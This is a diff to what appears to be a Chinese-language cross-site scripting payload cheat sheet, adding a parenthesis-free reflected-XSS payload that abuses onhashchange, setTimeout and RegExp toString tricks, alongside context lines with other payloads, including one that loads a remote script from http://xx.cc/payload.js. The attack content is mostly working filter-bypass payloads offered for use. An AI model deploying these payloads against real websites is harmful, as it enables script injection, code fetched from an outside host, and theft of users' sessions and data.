@@ -325,6 +325,15 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 "><script>document.writeln`<script+src\x3dhttp://xx.cc/payload.js><\x2fscript>`</script>
 ```
 
+- 不使用括号`(` `)` 仅适用于某些情况下的反射型XSS
+```
+# 适用条件: "目标站" 存在反射型XSS(会将code参数的值放入JavaScript上下文中),但参数值不能出现 括号()
+# 可使用以下payload实现XSS
+
+https://vul.com/vulpage?code=
+onhashchange=setTimeout;Object.prototype.toString=RegExp.prototype.toString;Object.prototype.source=location.hash;location.hash=null;#1/-alert(location.href)/
+```
+
 - 不使用尖括号`>`(angular bracket)来结束标签
 ```
 # 使用//可以结束svg标签 需//之后有任意标签<x> 则svg标签中的JavaScript就能成功执行
